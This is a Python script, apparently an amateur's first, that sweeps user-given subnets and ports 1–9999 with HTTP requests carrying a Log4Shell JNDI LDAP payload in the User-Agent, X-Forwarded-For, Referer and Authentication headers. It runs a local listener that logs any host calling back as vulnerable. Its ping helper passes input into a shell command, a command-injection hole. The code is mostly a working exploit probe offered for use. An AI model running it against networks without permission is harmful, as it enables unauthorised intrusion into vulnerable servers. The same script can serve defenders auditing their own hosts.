############################################################################
#           Please be nice, This is my first python script
#           This should work in theory.
#
#           it will ask for a port number default 1389
#           Enter in the host IP address that it is running on
#           Enter all subnets as 192.168.0.,192.168.1.
#
###########################################################################

import requests
import time
import threading
import webbrowser
import socket
import os
from datetime import datetime
import subprocess, platform

def log(string):
    now = datetime.now()
    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
    if os.path.isfile('log.txt'):
        f = open('log.txt', 'a')
        f.write("\n" + date_time + " " + string)
        f.close()
        print("\n" + date_time + " " + string)
    else:
        f = open('log.txt', 'x')
        f.write("\n" + date_time + " " + string)
        f.close()

def web_server(host, port):
    global connection_flag
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, int(port)))
            s.settimeout(None)
            s.listen()
            conn, addr = s.accept()
            with conn:
                if addr[0] != host:
                    log('Connected by: ' + addr[0])
                    print('Connected by: ', addr[0])
                    connection_flag = 1
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    conn.sendall(data)
        time.sleep(900)
        s.close()

def found(html, url):
    #webbrowser.open(url)
    pass

def mainloop(ip_addr, x):
    print('Testing: ' + str(ip_addr) + str(x))
    headers_list = {
            'User-Agent': str(payload),
            'X-Forwarded-For':  str(payload),
            'Referer':str(payload), 
            'Authentication':str(payload)
        }
    if pingOk(str(ip_addr) + str(x)):    
        for proto in protocol_list:
            url = proto + str(ip_addr) + str(x) 
            for port in range(1,10000):
                try:
                    response = requests.get((url + ':' + str(port)), headers=headers_list, timeout=1)
                    print('Found Webpage, Testing\n' + (url + ':' + str(port)) + '\n')
                    if response.status_code == 200:
                        found(response.content, (url + ':' + str(port)))
                    print(response)
                except:
                   pass
    else:
        pass

def pingOk(sHost):
    try:
        output = subprocess.check_output('ping -{} 1 {} | findstr /i "TTL"'.format('n' if platform.system().lower()=="windows" else 'c', sHost), shell=True)
    except Exception as e:
        return False
    print("Found Responding IP: " + sHost)
    return True

def thread_out():
    global connection_flag
    for sub in ip_addr:
        log("Scanning Subnet: " + sub + "0/24")
        connection_flag = 0
        for x in range(1,254):
            while True:
                if int(threading.active_count()) <= (int(max_threads)-1):
                    new_thread = threading.Thread(target = mainloop, args=(sub, x, ))
                    new_thread.name = sub + str(x)
                    new_thread.start()
                    break
                else:
                    os.system('cls' if os.name=='nt' else 'clear')
                    print("Threads still running: " + str(threading.active_count()))
                    print("Waiting for them to finish before starting more")
                    for thread in threading.enumerate(): 
                        if thread.name == "MainThread" or thread.name == "Web Server":
                            pass
                        else:
                            print("Scanning:" + thread.name)
                    time.sleep(.5)

port = input('port number\n')
host = input("Host IP address\n")
payload = "${jndi:ldap://" + host + ":" + port + "}"
protocol_list = ['http://']
max_threads = 102

ip_addr_input = input("Input Subnet: ex.192.168.89.\n")
ip_addr = ip_addr_input.split(',')
log("\n Starting Web Server")
new_thread = threading.Thread(target = web_server, args=(host, port, ))
new_thread.name = "Web Server"
new_thread.start()
enter = input("Copy & Paste: " + payload + "\n")
log("Starting Services")
log(payload)
thread_out()

while int(threading.active_count()) >= 3:
    os.system('cls' if os.name=='nt' else 'clear')
    print("Threads still running: " + str(threading.active_count()))
    for y in range (1,10):
        print('.')
        time.sleep(10)
    
if connection_flag != 0:
    log('Conncation has been made, please see vulnerability')
else:
    log('Connection logged, please see who connected.')
print("Complete")
